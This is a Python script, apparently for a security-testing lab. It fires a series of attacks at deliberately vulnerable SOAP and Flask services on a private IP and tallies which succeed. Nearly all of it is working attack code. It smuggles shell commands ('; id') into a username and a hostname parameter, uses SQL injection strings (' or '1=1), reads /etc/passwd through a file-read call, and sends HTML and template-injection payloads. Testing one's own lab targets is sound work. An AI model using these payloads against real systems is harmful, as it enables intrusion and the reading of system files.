import requests
import os
import socket
from suds.client import Client
successful_attack=0
unsuccessful_attack=0
soap_attack_number=5
rest_attack_number=4
vulnerable_ip="10.10.10.128"
print("Start cyber security control validation platform......")
print("Start vulnerable SOAP service control...")
sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
	result = sock.connect_ex((vulnerable_ip,8000))
	if result == 0:
		print("Vulnerable SOAP service is running")
	else:
		print("Vulnerable SOAP service isn't running")
except:
	pass
try:
	result = sock.connect_ex((vulnerable_ip,8001))
	if result == 0:
        	print("Vulnerable Flask App is running")
	else:
        	print("Vulnerable Flask App isn't running")
except:
	pass
sock.close()
try:
	soap_service="http://"+str(vulnerable_ip)+":8000/?wsdl"
	client=Client(soap_service)
	print("SOAP Command injection is testing...")
except:
	pass
try:
	result=client.service.get_users("kali /etc/passwd ; id \n# ")
	#print(result)
	if len(result)>51:
		successful_attack+=1
		print("Successful attack")
	else:
		unsuccessful_attack+=1
		print("Unsuccessful attack")
except:
	unsuccessful_attack+=1
	print("Unsuccessful attack")
	pass
print("SOAP Command injection is finished.")
print("SOAP SQL injection is testing...")
try:
	result=client.service.query("' or '1=1")
	#print(result)
	if "test" in result and "erlik" in result:
		successful_attack+=1
		print("Successful attack")
	else:
		unsuccessful_attack+=1
		print("Unsuccessful attack")
except:
	unsuccessful_attack+=1
	print("Unsuccessful attack")
	pass
print("SOAP SQL injection is finished.")
print("SOAP get data information disclosure is testing...")
try:
	result=client.service.get_admin_mail("admin")
	#print(result)
	if "admin@cybersecurity.intra" in result:
		successful_attack+=1
		print("Successful attack")
	else:
		unsuccessful_attack+=1
		print("Unsuccessful attack")
except:
	unsuccessful_attack+=1
	print("Unsuccessful attack")
	pass
print("SOAP get data information disclosure  is finished.")
print("SOAP get logs information disclosure is testing...")
try:
	result=client.service.get_admin_mail("admin")
	#print(result)
	if len(result)>0:
		successful_attack+=1
		print("Successful attack")
	else:
		unsuccessful_attack+=1
		print("Unsuccessful attack")
except:
	unsuccessful_attack+=1
	print("Unsuccessful attack")
	pass
print("SOAP get logs information disclosure  is finished.")
print("SOAP LFI is testing...")
try:
	result=client.service.read_file("/etc/passwd")
	#print(result)
	if "root" in result or "kali" in result:
		successful_attack+=1
		print("Successful attack")
	else:
		unsuccessful_attack+=1
		print("Unsuccessful attack")
except:
	unsuccessful_attack+=1
	print("Unsuccessful attack")
	pass
print("SOAP LFI is finished.")
print("Finished vulnerable SOAP service control...")
print("Start vulnerable Flask app control...")
print("Flask SQL injection is testing...")
try:
	url="http://"+str(vulnerable_ip)+":8001/user/' or '1=1"
	result=requests.get(url).json()
	#print(result)
	if "test" in result["data"] or "erlik" in result["data"]:
		successful_attack+=1
		print("Successful attack")
	else:
		unsuccessful_attack+=1
		print("Unsuccessful attack")
except:
	unsuccessful_attack+=1
	print("Unsuccessful attack")
	pass
print("Flask SQL injection is finished.")

print("Flask HTML injection is testing...")
try:
	url="http://"+str(vulnerable_ip)+":8001/welcome2/<h1>test"
	result=requests.get(url).content
	#print(result)
	if "<h1>test" in result.decode("ascii"):
		successful_attack+=1
		print("Successful attack")
	else:
		unsuccessful_attack+=1
		print("Unsuccessful attack")
except:
	unsuccessful_attack+=1
	print("Unsuccessful attack")
	pass
print("Flask HTML injection is finished.")
print("Flask SSTI is testing...")
try:
	url="http://"+str(vulnerable_ip)+":8001/hello?name={{7*7}}"
	result=requests.get(url).content
	#print(result)
	if "49" in result.decode("ascii"):
		successful_attack+=1
		print("Successful attack")
	else:
		unsuccessful_attack+=1
		print("Unsuccessful attack")
except:
	unsuccessful_attack+=1
	print("Unsuccessful attack")
	pass
print("Flask SSTI is finished.")
print("Flask command injection is testing...")
try:
	url="http://"+str(vulnerable_ip)+":8001/get_users?hostname=127.0.0.1;id"
	result=requests.get(url).content.decode("ascii")
#	print(result)
	if "root" in result or "kali" in result:
		successful_attack+=1
		print("Successful attack")
	else:
		unsuccessful_attack+=1
		print("Unsuccessful attack")
except:
	unsuccessful_attack+=1
	print("Unsuccessful attack")
	pass
print("Flask command injection is finished.")
print("Finished vulnerable Flask app control...")
print("Total attack:",str(soap_attack_number+rest_attack_number)," Successful attack:",str(successful_attack)," Unsuccessful attack:",unsuccessful_attack)
